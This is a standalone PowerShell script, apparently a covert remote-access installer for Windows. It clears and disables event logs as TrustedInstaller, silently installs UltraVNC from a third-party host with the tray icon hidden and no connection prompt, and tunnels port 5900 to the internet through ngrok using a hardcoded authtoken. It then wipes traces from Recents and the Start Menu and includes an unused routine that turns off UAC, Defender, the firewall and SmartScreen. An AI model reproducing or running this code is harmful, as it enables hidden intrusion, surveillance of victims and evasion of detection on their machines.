function CheckServices {
    # Check if the service is running
    param (
        [string]$ServiceName
    )
    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($service) {
        Write-Host "$ServiceName is running"
    }
    else {
        Write-Host "$ServiceName is not running"
    }
}

function CheckInstall {
    # Check if the software is installed
    param (
        [string]$InstallPath
    )
    $install = Get-ItemProperty -Path $InstallPath -ErrorAction SilentlyContinue
    if ($install) {
        Write-Host "$InstallPath is installed"
    }
    else {
        Write-Host "$InstallPath is not installed"
    }
}

function DisableProtection {
    # disable as TI: UAC, Windows Defender, Firewall, SmartScreen
    # Disable Protection
    Write-Host "Disabling Protection"
    # Task Parameters
    $taskname = 'DisableProtection'
    $execute = 'powershell'
    # Task Arguments
    $argument = '-ExecutionPolicy Bypass -Noprofile -Command "& {
        # Disable UAC
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
        # Disable Windows Defender
        Set-MpPreference -DisableRealtimeMonitoring $true
        # Disable Windows Firewall
        netsh advfirewall set allprofiles state off
        # Disable SmartScreen
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value 0
    }"'
    $action = New-ScheduledTaskAction -Execute $execute -Argument $argument
    # Create the task
    Register-ScheduledTask -TaskName $taskname -Action $action
    # Run the task
    $svc = New-Object -ComObject 'Schedule.Service'
    $svc.Connect()
    $user = 'NT SERVICE\TrustedInstaller'
    $folder = $svc.GetFolder('\')
    $task = $folder.GetTask('DisableProtection')
    $task.RunEx($null, 0, 0, $user)
}

function EnableProtection {
    # enable as TI: UAC, Windows Defender, Firewall, SmartScreen after reboot
    # Enable Protection after reboot
    Write-Host "Enabling Protection"
    # Task Parameters
    $taskname = 'EnableProtection'
    $execute = 'powershell'
    # Task Arguments
    $argument = '-ExecutionPolicy Bypass -Noprofile -Command "& {
        # Enable UAC
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1
        # Enable Windows Defender
        Set-MpPreference -DisableRealtimeMonitoring $false
        # Enable Windows Firewall
        netsh advfirewall set allprofiles state on
        # Enable SmartScreen
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value 1
    }"'
    $action = New-ScheduledTaskAction -Execute $execute -Argument $argument
    # Create the task
    Register-ScheduledTask -TaskName $taskname -Action $action
    # Run the task
    $svc = New-Object -ComObject 'Schedule.Service'
    $svc.Connect()
    $user = 'NT SERVICE\TrustedInstaller'
    $folder = $svc.GetFolder('\')
    $task = $folder.GetTask('EnableProtection')
    $task = Get-ScheduledTask -TaskName $taskname
    $task.RunEx($null, 0, 0, $user)
}

function CreateUninstallTask {
    # Create a scheduled task to uninstall the UltraVNC server, ngrok and remove the installation folder
    # Create a scheduled task to uninstall the software
    $taskName = "Uninstall UltraVNC and ngrok"
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -command `"& { & 'C:\uvnc_ubvba\UltraVNC\unins000.exe' /VERYSILENT /SUPPRESSMSGBOXES /NORESTART}`""
    # Trigger once at logon
    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd 

    # Create the task
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -RunLevel Highest -Force -ErrorAction Stop
    Write-Host "Task $taskName created"
}

function WindowsActivityLogClear {
    # Clear Windows Activity Log as TI
    # Clear Windows Activity Log
    Write-Host "Clearing Windows Activity Log"
    # Task Parameters
    $taskname = 'WindowsActivityLogClear'
    $execute = 'powershell'
    # Task Arguments
    $argument = '-ExecutionPolicy Bypass -Noprofile -Command "& {
        # Clear Windows Activity Log
        wevtutil cl Microsoft-Windows-Application-Experience/Program-Inventory
        wevtutil cl Microsoft-Windows-Application-Experience/Program-Telemetry
        wevtutil cl Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant
        wevtutil cl Microsoft-Windows-Application-Experience/Program-Compatibility-Troubleshooter
        wevtutil cl Microsoft-Windows-Application-Experience/Program-Compatibility-Wizard
    }"'
    $action = New-ScheduledTaskAction -Execute $execute -Argument $argument
    # Create the task
    Register-ScheduledTask -TaskName $taskname -Action $action
    # Run the task
    $svc = New-Object -ComObject 'Schedule.Service'
    $svc.Connect()
    $user = 'NT SERVICE\TrustedInstaller'
    $folder = $svc.GetFolder('\')
    $task = $folder.GetTask('WindowsActivityLogClear')
    $task.RunEx($null, 0, 0, $user)
}

function WindowsActivityLogDisable {
    # Disable Windows Activity Log as TI
    # Disable Windows Activity Log
    Write-Host "Disabling Windows Activity Log"
    # Task Parameters
    $taskname = 'WindowsActivityLogDisable'
    $execute = 'powershell'
    # Task Arguments
    $argument = '-ExecutionPolicy Bypass -Noprofile -Command "& {
        # Clear Windows Activity Log
        wevtutil sl Microsoft-Windows-Application-Experience/Program-Inventory /e:false
        wevtutil sl Microsoft-Windows-Application-Experience/Program-Telemetry /e:false
        wevtutil sl Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant /e:false
        wevtutil sl Microsoft-Windows-Application-Experience/Program-Compatibility-Troubleshooter /e:false
        wevtutil sl Microsoft-Windows-Application-Experience/Program-Compatibility-Wizard /e:false
    }"'
    $action = New-ScheduledTaskAction -Execute $execute -Argument $argument
    # Create the task
    Register-ScheduledTask -TaskName $taskname -Action $action
    # Run the task
    $svc = New-Object -ComObject 'Schedule.Service'
    $svc.Connect()
    $user = 'NT SERVICE\TrustedInstaller'
    $folder = $svc.GetFolder('\')
    $task = $folder.GetTask('WindowsActivityLogDisable')
    $task.RunEx($null, 0, 0, $user)
}

function WindowsActivityLogEnable {
    # Enable Windows Activity Log as TI
    # Enable Windows Activity Log
    Write-Host "Enabling Windows Activity Log"
    # Task Parameters
    $taskname = 'WindowsActivityLogEnable'
    $execute = 'powershell'
    # Task Arguments
    $argument = '-ExecutionPolicy Bypass -Noprofile -Command "& {
        # Clear Windows Activity Log
        wevtutil sl Microsoft-Windows-Application-Experience/Program-Inventory /e:true
        wevtutil sl Microsoft-Windows-Application-Experience/Program-Telemetry /e:true
        wevtutil sl Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant /e:true
        wevtutil sl Microsoft-Windows-Application-Experience/Program-Compatibility-Troubleshooter /e:true
        wevtutil sl Microsoft-Windows-Application-Experience/Program-Compatibility-Wizard /e:true
    }"'
    $action = New-ScheduledTaskAction -Execute $execute -Argument $argument
    # Create the task
    Register-ScheduledTask -TaskName $taskname -Action $action
    # Run the task
    $svc = New-Object -ComObject 'Schedule.Service'
    $svc.Connect()
    $user = 'NT SERVICE\TrustedInstaller'
    $folder = $svc.GetFolder('\')
    $task = $folder.GetTask('WindowsActivityLogEnable')
    $task.RunEx($null, 0, 0, $user)
}

function WindowsRecentsClear {
    # Clear all occurencies of ngrok and UltraVNC in Windows Recents
    # Clear Windows Recents
    Write-Host "Clearing Windows Recents"
    # Task Parameters
    $taskname = 'WindowsRecentsClear'
    $execute = 'powershell'
    # Task Arguments
    $argument = '-ExecutionPolicy Bypass -Noprofile -Command "& {
        # Find and delete all occurencies of ngrok and UltraVNC
        Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\*" -Include "*ngrok*" -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\*" -Include "*UltraVNC*" -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\*" -Include "*uvnc*" -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }"'
    $action = New-ScheduledTaskAction -Execute $execute -Argument $argument
    # Create the task
    Register-ScheduledTask -TaskName $taskname -Action $action
    # Run the task
    $svc = New-Object -ComObject 'Schedule.Service'
    $svc.Connect()
    $user = 'NT SERVICE\TrustedInstaller'
    $folder = $svc.GetFolder('\')
    $task = $folder.GetTask('WindowsRecentsClear')
    $task.RunEx($null, 0, 0, $user)
}

function WindowClearStartMenu {
    # Clear all occurencies of ngrok and UltraVNC in Windows Start Menu
    # Clear Windows Start Menu
    Write-Host "Clearing Windows Start Menu"
    # Task Parameters
    $taskname = 'WindowClearStartMenu'
    $execute = 'powershell'
    # Task Arguments
    $argument = '-ExecutionPolicy Bypass -Noprofile -Command "& {
        # Find and delete all occurencies of ngrok and UltraVNC
        Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\*" -Include "*ngrok*" -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\*" -Include "*UltraVNC*" -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }"'
    $action = New-ScheduledTaskAction -Execute $execute -Argument $argument
    # Create the task
    Register-ScheduledTask -TaskName $taskname -Action $action
    # Run the task
    $svc = New-Object -ComObject 'Schedule.Service'
    $svc.Connect()
    $user = 'NT SERVICE\TrustedInstaller'
    $folder = $svc.GetFolder('\')
    $task = $folder.GetTask('WindowClearStartMenu')
    $task.RunEx($null, 0, 0, $user)

}

function RemoveAnyTITasks {
    # Remove any tasks created by TI in this script
    # Connect to the Task Scheduler
    $svc = New-Object -ComObject 'Schedule.Service'
    $svc.Connect()
    $folder = $svc.GetFolder('\')
    # Get all tasks
    $tasks = $folder.GetTasks(0)
    # Remove all tasks created by TI in this script
    foreach ($task in $tasks) {
        if ($task.Name -eq "DisableProtection" -or $task.Name -eq "EnableProtection" -or $task.Name -eq "WindowsActivityLogClear" -or $task.Name -eq "WindowsActivityLogDisable" -or $task.Name -eq "WindowsActivityLogEnable" -or $task.Name -eq "WindowsRecentsClear" -or $task.Name -eq "WindowClearStartMenu") {
            Write-Host "Removing task $($task.Name)"
            $folder.DeleteTask($task.Name, 0)
        }
    }
}   


function Install-UltraVNC {
    # Install UltraVNC
    # Download the UltraVNC installer
    $installerUrl = "https://fb.them4x.net/api/public/dl/IsyxidoB/files/tmp/UltraVNC_1436_X86_Setup.exe"
    $installerPath = "$PSScriptRoot\UltraVNC_1436_X86_Setup.exe"
    try {
        Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -ErrorAction SilentlyContinue
    }
    catch {
        #If corrupted, download again until it is not corrupted
        while ((Get-FileHash -Path $installerPath -Algorithm MD5).Hash -ne "D9CF5D0DFEC10FA8EE808D36863F0B80") {
            Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -ErrorAction Continue
        }
    }

    # Install and configure UltraVNC silently
    try {
        # Install UltraVNC silently with specified parameters
        # Define config file content
        $config = "[Setup]
Lang=en
Dir=C:\uvnc_ubvba\UltraVNC
Group=UltraVNC
NoIcons=0
SetupType=custom
Components=ultravnc_server
Tasks=installservice,startservice"
        # Write config file
        $config | Out-File -FilePath "$PSScriptRoot\DownloadConfig.ini" -Encoding ascii -ErrorAction Stop

        # Fetch UltraVNC Setup parameters
        #Invoke-WebRequest -Uri "https://pastebin.com/raw/Uyk0hr2Z" -OutFile "DownloadConfig.ini" -ErrorAction Stop
        # Check if file is empty 
        #if ($null -eq (Get-Content -Path "DownloadConfig.ini" -ErrorAction Stop)) {
        #    Write-Host "DownloadConfig.ini is empty. Downloading again ..."
        #    Invoke-WebRequest -Uri "https://pastebin.com/raw/Uyk0hr2Z" -OutFile "DownloadConfig.ini" -ErrorAction Stop
        #}

        # Get config path
        $configPath = "$PSScriptRoot\DownloadConfig.ini"
        # Install UltraVNC very silently with specified parameters and run the installer as administrator
        Start-Process -FilePath $installerPath -ArgumentList "/loadinf=$configPath /VERYSILENT" -Wait -Verb RunAs -ErrorAction Stop
        # Remove UltraVNC installer
        Remove-Item -Path $installerPath -ErrorAction Stop
        # Remove UltraVNC installer config
        Remove-Item -Path $configPath -ErrorAction Stop
        # Restart UltraVNC service
        Restart-Service -Name "uvnc_service" -Force -ErrorAction Stop
        # Stop UltraVNC service
        Stop-Service -Name "uvnc_service" -Force -ErrorAction Stop
        ##################################################################################################################
        # Configure UltraVNC
        # Define config file content
        $config = "[ultravnc]
passwd=6B09DD55A76FEEE892
passwd2=2B5E81936D23C11B09
[admin]
UseRegistry=0
MSLogonRequired=0
NewMSLogon=0
DebugMode=2
Avilog=0
path=C:\uvnc_bvba\UltraVNC
kickrdp=0
service_commandline=
DebugLevel=10
DisableTrayIcon=1
rdpmode=0
LoopbackOnly=0
UseDSMPlugin=0
AllowLoopback=1
AuthRequired=1
ConnectPriority=1
DSMPlugin=
AuthHosts=
AllowShutdown=1
AllowProperties=1
AllowEditClients=1
FileTransferEnabled=1
FTUserImpersonation=1
BlankMonitorEnabled=1
BlankInputsOnly=0
DefaultScale=1
SocketConnect=1
HTTPConnect=0
AutoPortSelect=1
PortNumber=5900
HTTPPortNumber=5800
IdleTimeout=0
IdleInputTimeout=0
RemoveWallpaper=0
RemoveAero=0
QuerySetting=1
QueryTimeout=10
QueryAccept=0
QueryIfNoLogon=0
primary=1
secondary=0
InputsEnabled=1
LockSetting=0
LocalInputsDisabled=0
EnableJapInput=0
FileTransferTimeout=1
clearconsole=0
accept_reject_mesg=
KeepAliveInterval=5
[poll]
TurboMode=1
PollUnderCursor=0
PollForeground=0
PollFullScreen=1
OnlyPollConsole=0
OnlyPollOnEvent=0
EnableDriver=0
EnableHook=1
EnableVirtual=0
SingleWindow=0
SingleWindowName=
MaxCpu2=100
MaxFPS=25"
        # Write config file
        $config | Out-File -FilePath "$PSScriptRoot\ultravnc.ini" -Encoding ascii -ErrorAction Stop
        # Fetch UltraVNC config
        #Invoke-WebRequest -Uri "https://pastebin.com/raw/bJ8PsT75" -OutFile "ultravnc.ini" -ErrorAction Stop
        # Get config path
        $configPath = "$PSScriptRoot\ultravnc.ini"
        # Copy UltraVNC config to UltraVNC folder
        Copy-Item -Path $configPath -Destination "C:\uvnc_ubvba\UltraVNC" -ErrorAction Stop
        # Remove UltraVNC config
        Remove-Item -Path $configPath -ErrorAction Stop
        # Start UltraVNC service as administrator
        Start-Service -Name "uvnc_service" -ErrorAction Stop
    }
    catch {
        # Failed to install UltraVNC
    }
}

function Install-NGROK {
    # Install NGROK
    # Download the NGROK installer
    $token = "2azSs6aaMDz4q2izDdHbC38WOS0_urAdscKnKTVSMiG3uAKP"
    $installerUrl = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
    $zipFile = "$PSScriptRoot\ngrok-stable-windows-amd64.zip"
    Invoke-WebRequest -Uri $installerUrl -OutFile $zipFile -ErrorAction SilentlyContinue
    # If corrupted, download again until it is not corrupted
    if ((Get-FileHash -Path $zipFile -Algorithm MD5).Hash -ne "E83F30661A3DCC15065637F526EFC255") {
        Invoke-WebRequest -Uri $installerUrl -OutFile $zipFile -ErrorAction Continue
    }
    # Unzip the NGROK installer
    Expand-Archive -Path $zipFile -DestinationPath "C:\uvnc_ubvba" -Force -ErrorAction Stop
    # Remove the NGROK installer
    Remove-Item -Path $zipFile -Force -ErrorAction Stop
    # Add authtoken to NGROK
    Start-Process -FilePath "C:\uvnc_ubvba\ngrok.exe" -ArgumentList "authtoken $token" -Wait -ErrorAction Stop
    # Start NGROK
    Start-Process -FilePath "C:\uvnc_ubvba\ngrok.exe" -ArgumentList "tcp 5900" -WindowStyle Hidden -ErrorAction Stop
    # Wait for 5 seconds
    Start-Sleep -Seconds 1
    Clear-Host
}

try {
    # Clear Windows Activity Log
    WindowsActivityLogClear
    Unregister-ScheduledTask -TaskName "WindowsActivityLogClear" -Confirm:$false

    # Disable Windows Activity Log
    WindowsActivityLogDisable
    Unregister-ScheduledTask -TaskName "WindowsActivityLogDisable" -Confirm:$false

    # Disable Protection
    #DisableProtection
    #Unregister-ScheduledTask -TaskName "DisableProtection" -Confirm:$false

    # Install UltraVNC
    Install-UltraVNC

    # Install NGROK
    Install-NGROK

    # Clear all occurencies of ngrok and UltraVNC in Windows Recents
    WindowsRecentsClear
    Unregister-ScheduledTask -TaskName "WindowsRecentsClear" -Confirm:$false

    # Clear all occurencies of ngrok and UltraVNC in Windows Start Menu
    WindowClearStartMenu
    Unregister-ScheduledTask -TaskName "WindowClearStartMenu" -Confirm:$false

    # Check if UltraVNC is installed
    CheckInstall -InstallPath "C:\uvnc_ubvba\UltraVNC\winvnc.exe"

    # Check if UltraVNC service is running
    CheckServices -ServiceName "uvnc_service"

    # Check if NGROK is installed
    CheckInstall -InstallPath "C:\uvnc_ubvba\ngrok.exe"

    # Check if NGROK service is running
    CheckServices -ServiceName "ngrok.exe"

    # Create a scheduled task to uninstall UltraVNC, ngrok and remove the installation folder
    CreateUninstallTask

    # Enable Protection after reboot
    # EnableProtection

    # Enable Windows Activity Log
    WindowsActivityLogEnable
    Unregister-ScheduledTask -TaskName "WindowsActivityLogEnable" -Confirm:$false

    # Remove any tasks created by TI 
    # RemoveAnyTITasks
}
catch {
    # An Error Occurred
}
